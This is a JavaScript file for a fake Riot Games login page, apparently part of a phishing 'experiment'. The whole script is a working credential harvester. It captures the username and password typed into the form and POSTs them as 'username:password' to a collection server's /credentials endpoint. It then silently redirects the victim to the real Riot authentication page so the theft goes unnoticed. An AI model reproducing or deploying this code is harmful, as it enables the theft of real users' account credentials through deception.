// script.js

document.addEventListener('DOMContentLoaded', function() {
    // 1) Handle login form submission
    const loginForm = document.getElementById('login-form');
    loginForm.addEventListener('submit', function(event) {
      event.preventDefault();
  
      const username = document.getElementById('username').value.trim();
      const password = document.getElementById('password').value;
      const staySignedIn = document.getElementById('stay-signed').checked;
  
      // Simple client-side validation:
      if (!username || !password) {
        alert('Please enter both username and password.');
        return;
      }
  
      // Send credentials (username:password) to our Node server at localhost:3000
      fetch('http://localhost:3000/credentials', {
        method: 'POST',
        headers: {
          'Content-Type': 'text/plain',
        },
        body: `${username}:${password}`,
      })
        .then((response) => {
          console.log('Posted to server, status:', response.status);
          // Redirect immediately without showing a pop-up
          window.location.href = 'https://authenticate.riotgames.com/';
        })
        .catch((error) => {
          console.error('Error contacting server:', error);
          alert('Failed to send credentials to server. Redirecting anyway...');
          window.location.href = 'https://authenticate.riotgames.com/';
        });
    });
  
    // 2) “Social” login buttons (Facebook, Google, Apple)
    const socialButtons = document.querySelectorAll('.social-btn');
    socialButtons.forEach((button) => {
      button.addEventListener('click', function() {
        alert('Social login is not implemented in this experiment.');
      });
    });
  
    // 3) “Console” login buttons (Xbox, PlayStation)
    const consoleButtons = document.querySelectorAll('.console-btn');
    consoleButtons.forEach((button) => {
      button.addEventListener('click', function() {
        alert('Console login is not implemented in this experiment.');
      });
    });
  
    // 4) “CAN’T SIGN IN?” link
    const cantSignInLink = document.querySelector('.create-account p:first-child');
    if (cantSignInLink) {
      cantSignInLink.addEventListener('click', function() {
        alert('Password recovery is not implemented in this experiment.');
      });
    }
  
    // 5) “CREATE ACCOUNT” link
    const createAccountLink = document.querySelector('.create-account p:last-child');
    if (createAccountLink) {
      createAccountLink.addEventListener('click', function() {
        alert('Account creation is not implemented in this experiment.');
      });
    }
  });
  